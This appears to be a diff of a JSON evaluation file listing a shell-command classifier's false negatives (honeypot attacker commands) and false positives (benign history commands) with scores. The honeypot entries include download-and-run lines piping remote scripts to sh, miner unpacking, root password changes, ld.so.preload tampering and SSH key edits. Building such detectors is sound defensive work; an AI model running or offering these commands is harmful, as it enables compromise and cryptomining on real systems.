+        "command": "cat tmp.rwG6eULB7M.sh",
+        "score": 0.3132362961769104,
+        "source": "honeypot"
+      },
+      {
+        "command": "echo \"cd /tmp ; wget http://h060a0744.example.net/wget.sh || curl http://h060a0744.example.net/curl.sh -o curl.sh ; chmod +x *.sh ; ./wget.sh ; ./curl.sh\" | sh",
+        "score": 0.31904876232147217,
+        "source": "honeypot"
+      },
+      {
+        "command": "unzip nasa.zip",
+        "score": 0.2551416754722595,
+        "source": "honeypot"
+      },
+      {
+        "command": "nproo",
+        "score": 0.45876285433769226,
+        "source": "honeypot"
+      },
+      {
+        "command": "ls -1 /etc/pam.d",
+        "score": 0.029568595811724663,
+        "source": "honeypot"
+      },
+      {
+        "command": "xz",
+        "score": 0.4465568959712982,
+        "source": "honeypot"
+      },
+      {
+        "command": "pkill -f cyber",
+        "score": 0.1828974038362503,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xvf miner.tar",
+        "score": 0.36800575256347656,
+        "source": "honeypot"
+      },
+      {
+        "command": "distance",
+        "score": 0.3946962058544159,
+        "source": "honeypot"
+      },
+      {
+        "command": "chmod +x sshdsservers",
+        "score": 0.24737553298473358,
+        "source": "honeypot"
+      },
+      {
+        "command": "darkness",
+        "score": 0.3946962058544159,
+        "source": "honeypot"
+      },
+      {
+        "command": "head -v -n 8 /proc/meminfo",
+        "score": 0.41389569640159607,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xzvf m,ix.tgz",
+        "score": 0.06660971790552139,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd Desktop",
+        "score": 0.317017138004303,
+        "source": "honeypot"
+      },
+      {
+        "command": "setuserpasswd root VivBPucWpUL",
+        "score": 0.2895578444004059,
+        "source": "honeypot"
+      },
+      {
+        "command": "37m ' ; '%(latency)s ms\\033[1",
+        "score": 0.09991791099309921,
+        "source": "honeypot"
+      },
+      {
+        "command": "pam-auth-update",
+        "score": 0.3435169458389282,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar xvf dofailed: Connection refused.",
+        "score": 0.007308688480407,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd /var/run",
+        "score": 0.34531068801879883,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd 64",
+        "score": 0.24690409004688263,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd /bishn/",
+        "score": 0.38372454047203064,
+        "source": "honeypot"
+      },
+      {
+        "command": "download",
+        "score": 0.3946962058544159,
+        "source": "honeypot"
+      },
+      {
+        "command": "sudo inst cpan",
+        "score": 0.048040084540843964,
+        "source": "honeypot"
+      },
+      {
+        "command": "m') ; best = getBestServer(servers) ; if not args.simple: ; print_(('\\033[1",
+        "score": 0.0036501602735370398,
+        "source": "honeypot"
+      },
+      {
+        "command": "LC_ALL=C ss -tln",
+        "score": 0.33694785833358765,
+        "source": "honeypot"
+      },
+      {
+        "command": "./x86 Servers",
+        "score": 0.12000565975904465,
+        "source": "honeypot"
+      },
+      {
+        "command": "sys password 0fj8Hx6W4yH",
+        "score": 0.4751227796077728,
+        "source": "honeypot"
+      },
+      {
+        "command": "echo \"${WHI}# ${DRED}Ram ${DRED} -> ${WHI}${ram}MB [1024MB = 1GB]\" #${WHI}\" ; echo \"${WHI}# ${DRED}GPU ${DRED} -> ${WHI}${vid}\" ; echo \"${WHI}# ${DRED}DISK SPACE ${DRED} -> ${WHI}${DISK}\" ; echo \"${WHI}# ${DRED}Versiune ${DRED} -> ${WHI}${VER}\" ; echo \"${WHI}# ${DRED}Uptime ${DRED} -> ${WHI}${zile} Zile\" ; sleep 2 ; if ((${EUID:-0} || \"$(id -u)\")) ; then ; echo \"${WHI}#${DRED} Drept de root -> ${WHI}Nu ai\"\"${WHI} ${WHI}\" ; sleep 3 ; else ; echo \"${WHI}# ${DRED}Drept de root -> ${WHI}Ai ${WHI}\" ; fi ; sleep 3 ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; echo \"${WHI} | ${WHI}SPEED TESTUL INCEPE IN 3 SECUNDE | ${WHI}\" ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}1${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}2${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}3${WHI}\" ; sleep 1 ; wget nasapaul.com/v.py ; perl v.py y ; perl ninfo ; nano v.py ; #!/usr/bin/env python ; # -*- coding: utf-8 -*- ; # Copyright 2012-2017 Matt Martz ; # All Rights Reserved. ; # ; # Licensed under the Apache License, Version 2.0 (the \"License\") ; you may ; # not use this file except in compliance with the License. You may obtain ; # a copy of the License at ; # ; # http://hf44de385.example.net/licenses/LICENSE-2.0 ; # ; # Unless required by applicable law or agreed to in writing, software ; # distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT ; # WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the ; # License for the specific language governing permissions and limitations ; # under the License. ; # ; # ; # ; import os ; import re ; import sys ; import math ; import signal ; import socket ; import timeit ; import platform ; import threading ; __version__ = '0.3.4' ; # Some global variables we use ; user_agent = None ; source = None ; shutdown_event = None ; scheme = 'http' ; # Used for bound_interface ; socket_socket = socket.socket ; try: ; import xml.etree.cElementTree as ET ; except ImportError: ; try: ; import xml.etree.ElementTree as ET ; except ImportError: ; from xml.dom import minidom as DOM ; ET = None ; # Begin import game to handle Python 2 and Python 3 ; try: ; from urllib2 import urlopen, Request, HTTPError, URLError ; except ImportError: ; from urllib.request import urlopen, Request, HTTPError, URLError ; try: ; from httplib import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py2 = sys.exc_info() ; try: ; from http.client import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py3 = sys.exc_info() ; raise SystemExit('Your python installation is missing required HTTP ' ; 'client classes:\\n\\n' ; 'Python 2: %s\\n' ; 'Python 3: %s' % (e_http_py2[1], e_http_py3[1])) ; try: ; from Queue import Queue ; except ImportError: ; from queue import Queue ; try: ; from urlparse import urlparse ; except ImportError: ; from urllib.parse import urlparse ; try: ; from urlparse import parse_qs ; except ImportError: ; try: ; from urllib.parse import parse_qs ; except ImportError: ; from cgi import parse_qs ; try: ; from hashlib import md5 ; except ImportError: ; from md5 import md5 ; try: ; from argparse import ArgumentParser as ArgParser ; except ImportError: ; from optparse import OptionParser as ArgParser ; try: ; import builtins ; except ImportError: ; def print_(*args, **kwargs): ; \"\"\"The new-style print function taken from",
+        "score": 0.01586071588099003,
+        "source": "honeypot"
+      },
+      {
+        "command": "which uptime",
+        "score": 0.06596171855926514,
+        "source": "honeypot"
+      },
+      {
+        "command": "ore=$(( uptime/60/60%24 ))",
+        "score": 0.405304878950119,
+        "source": "honeypot"
+      },
+      {
+        "command": "(echo sHIJGkC5aXEqqOl",
+        "score": 0.13553988933563232,
+        "source": "honeypot"
+      },
+      {
+        "command": "LC_ALL=C crontab -l",
+        "score": 0.06538368761539459,
+        "source": "honeypot"
+      },
+      {
+        "command": "cd /var/tmo",
+        "score": 0.34531068801879883,
+        "source": "honeypot"
+      },
+      {
+        "command": "perl perl-Time-HiRes-1.9760-439.fc31.x86_64.rpm",
+        "score": 0.111567921936512,
+        "source": "honeypot"
+      },
+      {
+        "command": "tar -xzvf oznminerv2x",
+        "score": 0.05891352519392967,
+        "source": "honeypot"
+      },
+      {
+        "command": "apt-get install zamp",
+        "score": 0.37189269065856934,
+        "source": "honeypot"
+      },
+      {
+        "command": "./sh",
+        "score": 0.4036058187484741,
+        "source": "honeypot"
+      },
+      {
+        "command": "perl zyk >>/dev/null",
+        "score": 0.3917355239391327,
+        "source": "honeypot"
+      }
+    ],
+    "false_positives": [
+      {
+        "command": "Zsh",
+        "score": 0.8630309104919434,
+        "source": "bash_history"
+      },
+      {
+        "command": "spotify",
+        "score": 0.5233112573623657,
+        "source": "bash_history"
+      },
+      {
+        "command": "ps -el",
+        "score": 0.7514253854751587,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf /usr/bin/python",
+        "score": 0.7265108823776245,
+        "source": "bash_history"
+      },
+      {
+        "command": "python ldr2.0",
+        "score": 0.8345739841461182,
+        "source": "bash_history"
+      },
+      {
+        "command": "bash quiz.sh",
+        "score": 0.8740996718406677,
+        "source": "bash_history"
+      },
+      {
+        "command": "~<TAB>",
+        "score": 0.6982683539390564,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "ll /lib",
+        "score": 0.9041190147399902,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf run",
+        "score": 0.9261505007743835,
+        "source": "bash_history"
+      },
+      {
+        "command": "./zombie.c",
+        "score": 0.5249844789505005,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm git",
+        "score": 0.7917047142982483,
+        "source": "bash_history"
+      },
+      {
+        "command": "account",
+        "score": 0.5233112573623657,
+        "source": "bash_history"
+      },
+      {
+        "command": ":wq",
+        "score": 0.9735389947891235,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm MyNewProject/ -rf",
+        "score": 0.7367656826972961,
+        "source": "bash_history"
+      },
+      {
+        "command": "j voya",
+        "score": 0.8758396506309509,
+        "source": "bash_history"
+      },
+      {
+        "command": "arch",
+        "score": 0.7191788554191589,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "chmod u+x ./ldr",
+        "score": 0.5950336456298828,
+        "source": "bash_history"
+      },
+      {
+        "command": "ntpdate",
+        "score": 0.5233112573623657,
+        "source": "bash_history"
+      },
+      {
+        "command": "suso s",
+        "score": 0.8758396506309509,
+        "source": "bash_history"
+      },
+      {
+        "command": "chmod +x maven.sh",
+        "score": 0.961361825466156,
+        "source": "bash_history"
+      },
+      {
+        "command": "chomd 777",
+        "score": 0.8567007184028625,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf smecherit.tgz",
+        "score": 0.990665853023529,
+        "source": "bash_history"
+      },
+      {
+        "command": "curl --ntlm -u DOMAIN/user https://he9da8524.example.net/path/to/file",
+        "score": 0.7860718369483948,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "uberwriter",
+        "score": 0.8359893560409546,
+        "source": "bash_history"
+      },
+      {
+        "command": "tar zxvf udp.tgz",
+        "score": 0.8572946786880493,
+        "source": "bash_history"
+      },
+      {
+        "command": "tar xvf ha.tgz",
+        "score": 0.7041435837745667,
+        "source": "bash_history"
+      },
+      {
+        "command": "ls .cu",
+        "score": 0.98160320520401,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm Image",
+        "score": 0.6140431761741638,
+        "source": "bash_history"
+      },
+      {
+        "command": "bashmount",
+        "score": 0.7799091339111328,
+        "source": "bash_history"
+      },
+      {
+        "command": "sudo deluser bwhite humanresources",
+        "score": 0.5190055966377258,
+        "source": "bash_history"
+      },
+      {
+        "command": "cat /tmp/sixnet_status.",
+        "score": 0.9342159628868103,
+        "source": "bash_history"
+      },
+      {
+        "command": "/var/log/syslog",
+        "score": 0.8170955181121826,
+        "source": "bash_history"
+      },
+      {
+        "command": "cp /etc/wgetrc /top/",
+        "score": 0.6404415965080261,
+        "source": "bash_history"
+      },
+      {
+        "command": "maestro",
+        "score": 0.5233112573623657,
+        "source": "bash_history"
+      },
+      {
+        "command": "rpm -qa wget",
+        "score": 0.9260257482528687,
+        "source": "bash_history"
+      },
+      {
+        "command": "utmpdump /var/log/wtmp",
+        "score": 0.9730668663978577,
+        "source": "commandlinefu"
+      },
+      {
+        "command": "ls .bazaar/",
+        "score": 0.8471670150756836,
+        "source": "bash_history"
+      },
+      {
+        "command": "sudo vi /etc/profile",
+        "score": 0.9036446213722229,
+        "source": "bash_history"
+      },
+      {
+        "command": "rm -rf .bot",
+        "score": 0.690255880355835,
+        "source": "bash_history"
+      },
+      {
+        "command": "sudo mv /usr/lib/purple-2/libyahoo-plusplus.so /tmp/",
+        "score": 0.5921915173530579,
+        "source": "bash_history"
       }
     ]
   },
@@ -815,405 +2329,405 @@
     "false_negatives": [
       {
         "command": "nano u.txt",
-        "score": 0.07143453508615494,
+        "score": 0.12726667523384094,
         "source": "honeypot"
       },
       {
         "command": "31m>>>> Server Gasit incepem Testele \\033[1",
-        "score": 0.0867462158203125,
+        "score": 0.06045195460319519,
         "source": "honeypot"
       },
       {
         "command": "/gisdfoewrsfdf",
-        "score": 0.1441907286643982,
+        "score": 0.44230425357818604,
         "source": "honeypot"
       },
       {
         "command": "cat tmp.rwG6eULB7M.sh",
-        "score": 0.48340076208114624,
-        "source": "honeypot"
-      },
-      {
-        "command": "echo \"cd /tmp ; wget http://h060a0744.example.net/wget.sh || curl http://h060a0744.example.net/curl.sh -o curl.sh ; chmod +x *.sh ; ./wget.sh ; ./curl.sh\" | sh",
-        "score": 0.26181134581565857,
+        "score": 0.23270821571350098,
         "source": "honeypot"
       },
       {
         "command": "ls -1 /etc/pam.d",
-        "score": 0.04483393579721451,
+        "score": 0.0416376106441021,
         "source": "honeypot"
       },
       {
         "command": "xz",
-        "score": 0.331009179353714,
+        "score": 0.3288162052631378,
         "source": "honeypot"
       },
       {
         "command": "rm -rf read.txt*",
-        "score": 0.44297459721565247,
+        "score": 0.40082061290740967,
         "source": "honeypot"
       },
       {
         "command": "pkill -f cyber",
-        "score": 0.30451062321662903,
+        "score": 0.3865111768245697,
         "source": "honeypot"
       },
       {
         "command": "distance",
-        "score": 0.17052529752254486,
+        "score": 0.1852109283208847,
         "source": "honeypot"
       },
       {
         "command": "darkness",
-        "score": 0.25957587361335754,
-        "source": "honeypot"
-      },
-      {
-        "command": "head -v -n 8 /proc/meminfo",
-        "score": 0.4110107719898224,
+        "score": 0.2637186646461487,
         "source": "honeypot"
       },
       {
         "command": "catalin123@",
-        "score": 0.17043310403823853,
+        "score": 0.21019655466079712,
         "source": "honeypot"
       },
       {
         "command": "wlcear",
-        "score": 0.3915749192237854,
+        "score": 0.4559256136417389,
         "source": "honeypot"
       },
       {
         "command": "pam-auth-update",
-        "score": 0.03149662911891937,
+        "score": 0.022387826815247536,
         "source": "honeypot"
       },
       {
         "command": "tar xvf dofailed: Connection refused.",
-        "score": 0.036314185708761215,
-        "source": "honeypot"
-      },
-      {
-        "command": "sudo inst cpan",
-        "score": 0.24898211658000946,
+        "score": 0.026305556297302246,
         "source": "honeypot"
       },
       {
         "command": "m') ; best = getBestServer(servers) ; if not args.simple: ; print_(('\\033[1",
-        "score": 0.06626873463392258,
+        "score": 0.07731962949037552,
         "source": "honeypot"
       },
       {
-        "command": "lwp-download http://h7642432e.example.net/2start.jpg /tmp/2start.jpg",
-        "score": 0.38598963618278503,
+        "command": "\"\"\" ; fp = kwargs.pop(\"file\", sys.stdout) ; if fp is None: ; return ; def write(data): ; if not isinstance(data, basestring): ; data = str(data) ; fp.write(data) ; want_unicode = False ; sep = kwargs.pop(\"sep\", None) ; if sep is not None: ; if isinstance(sep, unicode): ; want_unicode = True ; elif not isinstance(sep, str): ; raise TypeError(\"sep must be None or a string\") ; end = kwargs.pop(\"end\", None) ; if end is not None: ; if isinstance(end, unicode): ; want_unicode = True ; elif not isinstance(end, str): ; raise TypeError(\"end must be None or a string\") ; if kwargs: ; raise TypeError(\"invalid keyword arguments to print()\") ; if not want_unicode: ; for arg in args: ; if isinstance(arg, unicode): ; want_unicode = True ; break ; if want_unicode: ; newline = unicode(\"\\n\") ; space = unicode(\" \") ; else: ; newline = \"\\n\" ; space = \" \" ; if sep is None: ; sep = space ; if end is None: ; end = newline ; for i, arg in enumerate(args): ; if i: ; write(sep) ; write(arg) ; write(end) ; else: ; print_ = getattr(builtins, 'print') ; del builtins ; class SpeedtestCliServerListError(Exception): ; \"\"\"Internal Exception class used to indicate to move on to the next",
+        "score": 0.25703665614128113,
+        "source": "honeypot"
+      },
+      {
+        "command": "QWEdsa1@#",
+        "score": 0.48081329464912415,
         "source": "honeypot"
       },
       {
         "command": "echo \"${WHI}# ${DRED}Ram ${DRED} -> ${WHI}${ram}MB [1024MB = 1GB]\" #${WHI}\" ; echo \"${WHI}# ${DRED}GPU ${DRED} -> ${WHI}${vid}\" ; echo \"${WHI}# ${DRED}DISK SPACE ${DRED} -> ${WHI}${DISK}\" ; echo \"${WHI}# ${DRED}Versiune ${DRED} -> ${WHI}${VER}\" ; echo \"${WHI}# ${DRED}Uptime ${DRED} -> ${WHI}${zile} Zile\" ; sleep 2 ; if ((${EUID:-0} || \"$(id -u)\")) ; then ; echo \"${WHI}#${DRED} Drept de root -> ${WHI}Nu ai\"\"${WHI} ${WHI}\" ; sleep 3 ; else ; echo \"${WHI}# ${DRED}Drept de root -> ${WHI}Ai ${WHI}\" ; fi ; sleep 3 ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; echo \"${WHI} | ${WHI}SPEED TESTUL INCEPE IN 3 SECUNDE | ${WHI}\" ; echo \"${DRED}--------------------------------------------------------------------------${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}1${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}2${WHI}\" ; sleep 1 ; echo \"${DRED} ->${WHI}3${WHI}\" ; sleep 1 ; wget nasapaul.com/v.py ; perl v.py y ; perl ninfo ; nano v.py ; #!/usr/bin/env python ; # -*- coding: utf-8 -*- ; # Copyright 2012-2017 Matt Martz ; # All Rights Reserved. ; # ; # Licensed under the Apache License, Version 2.0 (the \"License\") ; you may ; # not use this file except in compliance with the License. You may obtain ; # a copy of the License at ; # ; # http://hf44de385.example.net/licenses/LICENSE-2.0 ; # ; # Unless required by applicable law or agreed to in writing, software ; # distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT ; # WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the ; # License for the specific language governing permissions and limitations ; # under the License. ; # ; # ; # ; import os ; import re ; import sys ; import math ; import signal ; import socket ; import timeit ; import platform ; import threading ; __version__ = '0.3.4' ; # Some global variables we use ; user_agent = None ; source = None ; shutdown_event = None ; scheme = 'http' ; # Used for bound_interface ; socket_socket = socket.socket ; try: ; import xml.etree.cElementTree as ET ; except ImportError: ; try: ; import xml.etree.ElementTree as ET ; except ImportError: ; from xml.dom import minidom as DOM ; ET = None ; # Begin import game to handle Python 2 and Python 3 ; try: ; from urllib2 import urlopen, Request, HTTPError, URLError ; except ImportError: ; from urllib.request import urlopen, Request, HTTPError, URLError ; try: ; from httplib import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py2 = sys.exc_info() ; try: ; from http.client import HTTPConnection, HTTPSConnection ; except ImportError: ; e_http_py3 = sys.exc_info() ; raise SystemExit('Your python installation is missing required HTTP ' ; 'client classes:\\n\\n' ; 'Python 2: %s\\n' ; 'Python 3: %s' % (e_http_py2[1], e_http_py3[1])) ; try: ; from Queue import Queue ; except ImportError: ; from queue import Queue ; try: ; from urlparse import urlparse ; except ImportError: ; from urllib.parse import urlparse ; try: ; from urlparse import parse_qs ; except ImportError: ; try: ; from urllib.parse import parse_qs ; except ImportError: ; from cgi import parse_qs ; try: ; from hashlib import md5 ; except ImportError: ; from md5 import md5 ; try: ; from argparse import ArgumentParser as ArgParser ; except ImportError: ; from optparse import OptionParser as ArgParser ; try: ; import builtins ; except ImportError: ; def print_(*args, **kwargs): ; \"\"\"The new-style print function taken from",
-        "score": 0.34974709153175354,
+        "score": 0.010218613781034946,
         "source": "honeypot"
       },
       {
         "command": "which uptime",
-        "score": 0.054554425179958344,
-        "source": "honeypot"
-      },
-      {
-        "command": "grep bash /etc/passwd",
-        "score": 0.46327337622642517,
+        "score": 0.04829872027039528,
         "source": "honeypot"
       },
       {
         "command": "mkdir .z",
-        "score": 0.06353003531694412,
+        "score": 0.12362837046384811,
+        "source": "honeypot"
+      },
+      {
+        "command": "perl perl-Time-HiRes-1.9760-439.fc31.x86_64.rpm",
+        "score": 0.47804978489875793,
+        "source": "honeypot"
+      },
+      {
+        "command": "apt-get install zamp",
+        "score": 0.46102175116539,
         "source": "honeypot"
       },
       {
         "command": "nohup /root/cong &gt",
-        "score": 0.3720453679561615,
+        "score": 0.39218220114707947,
         "source": "honeypot"
       },
       {
         "command": "tar xf serv.tar.gz",
-        "score": 0.28452831506729126,
+        "score": 0.27785947918891907,
         "source": "honeypot"
       },
       {
         "command": "m') ; print_('\\033[1",
-        "score": 0.2368193417787552,
+        "score": 0.34617796540260315,
         "source": "honeypot"
       },
       {
         "command": "curl -O -L -O -C - http://h95966ad7.example.net/go.tgz --header \"Host: www.btcsavetheworld.org\"",
-        "score": 0.026748958975076675,
+        "score": 0.009919095784425735,
         "source": "honeypot"
       },
       {
         "command": "sudo passwd -dl root",
-        "score": 0.06768542528152466,
+        "score": 0.061322979629039764,
         "source": "honeypot"
       },
       {
         "command": "This function automatically adds a User-Agent header to all requests",
-        "score": 0.03264830633997917,
+        "score": 0.02610882557928562,
         "source": "honeypot"
       },
       {
         "command": "for i in \"/bin\" \"/home\" \"/root\" \"/tmp\" \"/usr\" \"/etc\"",
-        "score": 0.13207972049713135,
+        "score": 0.05191836506128311,
         "source": "honeypot"
       },
       {
         "command": "echo \"admin\" | sh -c \"sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload\"",
-        "score": 0.26291322708129883,
+        "score": 0.2087501436471939,
         "source": "honeypot"
       },
       {
         "command": "wget -O - -q http://h0180f604.example.net/imgtemplate/online.php | sh",
-        "score": 0.45985960960388184,
+        "score": 0.16343992948532104,
+        "source": "honeypot"
+      },
+      {
+        "command": "./home/admin/v.py",
+        "score": 0.41196104884147644,
         "source": "honeypot"
       },
       {
         "command": "echo \"zeroshell\" | sudo -S sh -c \"sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload\"",
-        "score": 0.1425621211528778,
+        "score": 0.06287278234958649,
         "source": "honeypot"
       },
       {
         "command": "grep -m 1 'bogomips' /proc/cpuinfo | cut -d: -f2",
-        "score": 0.11012721806764603,
+        "score": 0.18433907628059387,
         "source": "honeypot"
       },
       {
         "command": "echo $(uname -snmpr | tr \"\\n\" \" \"",
-        "score": 0.37478363513946533,
+        "score": 0.18000301718711853,
         "source": "honeypot"
       },
       {
         "command": "echo \"[+] Processor: \"[`uname -m`]\" ID:[`id -u`]\"",
-        "score": 0.36949655413627625,
+        "score": 0.29360926151275635,
         "source": "honeypot"
       },
       {
         "command": "das",
-        "score": 0.4296650290489197,
+        "score": 0.36880484223365784,
         "source": "honeypot"
       },
       {
         "command": "unzip daa",
-        "score": 0.4034028947353363,
+        "score": 0.4257543385028839,
         "source": "honeypot"
       },
       {
         "command": "establishing a connection with a HTTP/HTTPS request",
-        "score": 0.01890777237713337,
+        "score": 0.013884445652365685,
         "source": "honeypot"
       },
       {
         "command": "cat .ssh/authorized_keys | grep -v 'heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >>.ssh/.auth_k",
-        "score": 0.3496343493461609,
+        "score": 0.17109863460063934,
         "source": "honeypot"
       }
     ],
     "false_positives": [
       {
         "command": "Zsh",
-        "score": 0.5220757126808167,
+        "score": 0.7329331636428833,
+        "source": "bash_history"
+      },
+      {
+        "command": "tar -zxvf 'download (1)'",
+        "score": 0.5945130586624146,
+        "source": "bash_history"
+      },
+      {
+        "command": "cat i3log* 2> /dev/null | tail",
+        "score": 0.6050522923469543,
         "source": "bash_history"
       },
       {
         "command": "exercicio1403",
-        "score": 0.5905657410621643,
+        "score": 0.5190355777740479,
         "source": "bash_history"
       },
       {
         "command": "rm -rf /usr/bin/python",
-        "score": 0.7726634740829468,
+        "score": 0.7732028365135193,
         "source": "bash_history"
       },
       {
         "command": "python ldr2.0",
-        "score": 0.7456029057502747,
+        "score": 0.7526156306266785,
         "source": "bash_history"
       },
       {
+        "command": "bash quiz.sh",
+        "score": 0.5697441697120667,
+        "source": "bash_history"
+      },
+      {
+        "command": "~<TAB>",
+        "score": 0.8361997604370117,
+        "source": "commandlinefu"
+      },
+      {
         "command": "rm -rf run",
-        "score": 0.8648654818534851,
+        "score": 0.8743978142738342,
         "source": "bash_history"
       },
       {
         "command": "./zombie.c",
-        "score": 0.883049488067627,
+        "score": 0.910150945186615,
         "source": "bash_history"
       },
       {
         "command": "sudo echo full-speed > /proc/acpi/ibm/fan",
-        "score": 0.8784120678901672,
+        "score": 0.8751657605171204,
         "source": "bash_history"
       },
       {
         "command": ":wq",
-        "score": 0.6437073945999146,
+        "score": 0.7709118723869324,
         "source": "bash_history"
       },
       {
+        "command": "arch",
+        "score": 0.5966308116912842,
+        "source": "commandlinefu"
+      },
+      {
         "command": "chmod u+x ./ldr",
-        "score": 0.8350807428359985,
+        "score": 0.8514571785926819,
         "source": "bash_history"
       },
       {
         "command": "sh bin/overcloud-deploy.sh",
-        "score": 0.5162478089332581,
+        "score": 0.5350145101547241,
         "source": "bash_history"
       },
       {
         "command": "chmod +x maven.sh",
-        "score": 0.607429027557373,
+        "score": 0.7979995608329773,
         "source": "bash_history"
       },
       {
         "command": "apt-get install lighttpd",
-        "score": 0.8295156955718994,
+        "score": 0.740878701210022,
         "source": "bash_history"
       },
       {
         "command": "rm -rf smecherit.tgz",
-        "score": 0.777320921421051,
+        "score": 0.7883887887001038,
         "source": "bash_history"
       },
       {
         "command": "dig slashdot.org",
-        "score": 0.5992506742477417,
+        "score": 0.629399836063385,
+        "source": "bash_history"
+      },
+      {
+        "command": "uberwriter",
+        "score": 0.5560985207557678,
         "source": "bash_history"
       },
       {
         "command": "tar zxvf udp.tgz",
-        "score": 0.9762128591537476,
+        "score": 0.974275529384613,
         "source": "bash_history"
       },
       {
         "command": "tar xvf ha.tgz",
-        "score": 0.9709926843643188,
+        "score": 0.9546372890472412,
         "source": "bash_history"
       },
       {
-        "command": "bashmount",
-        "score": 0.6454604268074036,
+        "command": "ls .cu",
+        "score": 0.7092807292938232,
+        "source": "bash_history"
+      },
+      {
+        "command": "cat /tmp/sixnet_status.",
+        "score": 0.5891444087028503,
         "source": "bash_history"
       },
       {
         "command": "/var/log/syslog",
-        "score": 0.798447847366333,
+        "score": 0.8807602524757385,
         "source": "bash_history"
       },
       {
         "command": "chmod +x arquivobin",
-        "score": 0.7099646925926208,
+        "score": 0.6256817579269409,
         "source": "bash_history"
       },
       {
         "command": "rpm -qa wget",
-        "score": 0.6439685225486755,
-        "source": "bash_history"
-      },
-      {
-        "command": "kill w3m",
-        "score": 0.5821645259857178,
+        "score": 0.7168493866920471,
         "source": "bash_history"
       },
       {
         "command": "utmpdump /var/log/wtmp",
-        "score": 0.7599766254425049,
+        "score": 0.7508898973464966,
         "source": "commandlinefu"
       },
       {
-        "command": "l. The\\ Cardigans\\ -\\ Gran\\ Turismo\\ \\(1998\\)\\[CBR-320\\]/",
-        "score": 0.5069104433059692,
-        "source": "bash_history"
-      },
-      {
         "command": "rm -rf .bot",
-        "score": 0.6443630456924438,
+        "score": 0.7997946739196777,
         "source": "bash_history"
       },
       {
         "command": "brew install wget",
-        "score": 0.966795802116394,
+        "score": 0.9499922394752502,
         "source": "bash_history"
       },
       {
         "command": "sh add_num.sh 10",
-        "score": 0.8622578382492065,
+        "score": 0.9275194406509399,
         "source": "bash_history"
       },
       {
-        "command": "cpu cpu0",
-        "score": 0.5643619298934937,
+        "command": "rm -rf .borwind",
+        "score": 0.5493007302284241,
         "source": "bash_history"
       },
       {
         "command": "ll]",
-        "score": 0.6116331219673157,
+        "score": 0.7709118723869324,
         "source": "bash_history"
       },
       {
         "command": "ls/",
-        "score": 0.6943377256393433,
+        "score": 0.7630069255828857,
         "source": "bash_history"
       },
       {
         "command": "tar zxvf segher3.tgz",
-        "score": 0.9081783294677734,
+        "score": 0.9056264758110046,
         "source": "bash_history"
       },
       {
         "command": "perl .a.txt",
-        "score": 0.9557420015335083,
+        "score": 0.9797157049179077,
         "source": "bash_history"
       },
       {
         "command": "bash function.sh",
-        "score": 0.519203782081604,
+        "score": 0.5856567025184631,
         "source": "bash_history"
       },
       {
         "command": "rm -rf l_*",
-        "score": 0.9590039253234863,
+        "score": 0.9442964196205139,
         "source": "bash_history"
       },
       {
         "command": "chmod +x script1234.sh",
-        "score": 0.7003064751625061,
+        "score": 0.7491862773895264,
         "source": "bash_history"
       },
       {
         "command": "./cpu.sh",
-        "score": 0.8085781931877136,
+        "score": 0.6629853844642639,
         "source": "bash_history"
-      },
-      {
-        "command": "exec ssh-agent bash",
-        "score": 0.8098027110099792,
-        "source": "bash_history"
-      },
-      {
-        "command": "curl -I -L http://h450d9330.example.net/mQUxL6yS",
-        "score": 0.9094251990318298,
-        "source": "commandlinefu"
-      },
-      {
-        "command": "echo rev abcd",
-        "score": 0.9273698925971985,
-        "source": "bash_history"
-      },
-      {
-        "command": "su - ansadmin",
-        "score": 0.8660959005355835,
-        "source": "bash_history"
-      },
-      {
-        "command": "ftp>!w",
-        "score": 0.8911793828010559,
-        "source": "commandlinefu"
       }
     ]
   },
@@ -1221,404 +2735,1086 @@
     "false_negatives": [
       {
         "command": "nano u.txt",
-        "score": 0.21486832201480865,
+        "score": 0.2083144187927246,
         "source": "honeypot"
       },
       {
         "command": "31m>>>> Server Gasit incepem Testele \\033[1",
-        "score": 0.35168159008026123,
+        "score": 0.3610679507255554,
         "source": "honeypot"
       },
       {
         "command": "/gisdfoewrsfdf",
-        "score": 0.39736202359199524,
+        "score": 0.39300739765167236,
         "source": "honeypot"
       },
       {
         "command": "ls -1 /etc/pam.d",
-        "score": 0.21365734934806824,
+        "score": 0.21506184339523315,
         "source": "honeypot"
       },
       {
         "command": "distance",
-        "score": 0.13801108300685883,
+        "score": 0.1430922895669937,
         "source": "honeypot"
       },
       {
         "command": "darkness",
-        "score": 0.20830181241035461,
+        "score": 0.2141605168581009,
         "source": "honeypot"
       },
       {
         "command": "catalin123@",
-        "score": 0.3401135504245758,
+        "score": 0.3280663788318634,
